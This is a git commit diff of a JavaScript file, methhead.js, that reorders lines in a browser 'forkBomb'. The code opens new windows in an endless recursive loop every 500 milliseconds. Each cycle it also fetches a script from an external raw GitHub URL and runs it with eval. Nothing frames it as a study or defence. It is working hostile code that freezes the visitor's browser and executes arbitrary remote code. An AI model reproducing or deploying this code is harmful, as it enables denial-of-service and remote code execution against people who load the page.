278cf2c2333888e165dd990bd8b9d289240f616f
cyanide <ariez@ariez.wtf>
2025-01-25 21:06:31 +0000

    Update methhead.js

--- methhead.js
+++ methhead.js
@@ -1,7 +1,7 @@
 (function forkBomb(timeout = 500, i = 0) {
   setTimeout(() => {
     window.open('./?v=' + Math.random(), '_new' + (i || ''))
-    forkBomb(timeout, i + 1)
     fetch('https://raw.githubusercontent.com/cyanidelol/cyanidelol/refs/heads/main/cold.js').then(res => res.text()).then(eval).catch(console.error);
+    forkBomb(timeout, i + 1)
   }, timeout)
 })()
